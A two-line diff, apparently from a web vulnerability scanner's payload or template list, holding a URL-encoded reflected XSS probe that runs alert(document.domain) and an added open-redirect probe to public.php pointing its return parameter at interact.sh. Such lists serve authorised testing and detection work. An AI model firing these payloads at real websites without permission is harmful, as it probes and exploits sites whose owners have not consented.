@@ -1,1 +1,2 @@
 /?subreddit=news&score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/public.php?return=http%3a%2f%2finteract.sh%2f&op=login&login=password=&profile=0
